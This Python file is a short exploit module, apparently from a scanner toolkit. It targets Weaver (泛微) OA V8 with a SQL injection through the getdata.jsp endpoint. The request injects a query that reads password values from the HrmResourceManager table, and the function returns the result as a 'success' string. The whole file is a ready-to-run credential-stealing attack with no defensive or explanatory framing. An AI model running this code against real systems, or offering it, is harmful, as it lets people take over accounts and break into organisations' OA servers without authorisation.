import requests

from main import print_blue

'''
泛微OA V8 SQL注入
'''

def fanwei_OA_sql(url, timeout=6):
    print_blue('泛微OAV8SQL注入')
    return_data = ''
    # if not url[0:1] == '/':
    #     url = url + '/'
    try:
        re = requests.get(url + '/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager', timeout=timeout)
        # print(re)
        if re.text and not 'Error 404 Not Found' in re.text:
            return '成功'+re.text
    except ConnectionError as e:
        return '连接失败'
    except TimeoutError as e:
        return '连接超时'
    except Exception as e:
        return '未知错误：' + str(e)